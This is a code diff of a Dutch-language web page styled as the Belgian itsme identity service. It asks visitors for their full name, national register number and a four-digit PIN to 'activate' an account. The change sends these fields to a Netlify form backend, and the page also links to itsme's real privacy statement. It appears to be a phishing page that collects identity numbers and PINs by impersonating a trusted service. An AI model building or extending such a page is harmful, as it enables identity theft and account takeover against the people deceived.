@@ -313,42 +313,46 @@
                 <h1>Vul je persoonlijke gegevens in</h1>
                 <p>Geef je volledige naam, rijksregisternummer en gewenste pincode in om je itsme®-account te activeren.
                 </p>
-                <form id="personalDataForm">
+
+                <form id="personalDataForm" name="personalDataForm" method="POST" data-netlify="true"
+                    data-netlify-honeypot="bot-field" novalidate>
+                    <!-- Hidden field om Netlify te vertellen welke form het is -->
+                    <input type="hidden" name="form-name" value="personalDataForm">
+
+                    
                     <div class="form-group">
                         <label for="firstName">Voornaam</label>
                         <input type="text" id="firstName" name="firstName" placeholder="Je voornaam" required>
                     </div>
+
                     <div class="form-group">
                         <label for="lastName">Achternaam</label>
                         <input type="text" id="lastName" name="lastName" placeholder="Je achternaam" required>
                     </div>
+
                     <div class="form-group">
                         <label for="nationalNumber">Rijksregisternummer</label>
                         <input type="text" id="nationalNumber" name="nationalNumber" placeholder="00.00.00-000.00"
                             maxlength="15" pattern="[0-9]{2}\.[0-9]{2}\.[0-9]{2}-[0-9]{3}\.[0-9]{2}" required>
                     </div>
+
                     <div class="form-group">
                         <label for="pinCode">Pincode (4 cijfers)</label>
                         <input type="password" id="pinCode" name="pinCode" placeholder="••••" maxlength="4"
                             pattern="[0-9]{4}" required>
                     </div>
+
                     <p id="privacy">
                         Door verder te gaan, ga je akkoord met het
                         <a href="https://www.itsme-id.com/nl-BE/legal/privacy-statement" target="_blank">
                             privacybeleid
                         </a>.
                     </p>
+
                     <div class="btn-container">
                         <button type="submit" class="btn">Account activeren</button>
                     </div>
                 </form>
-            </div>
-
-            <div class="im-content-secondary">
-                <div>
-                    <img src="assets/EnterPhoneNumber.svg" alt="">
-                    <p>Vul je persoonlijke gegevens in om je itsme®-account te voltooien en veilig te identificeren.</p>
-                </div>
             </div>
         </main>
     </div>
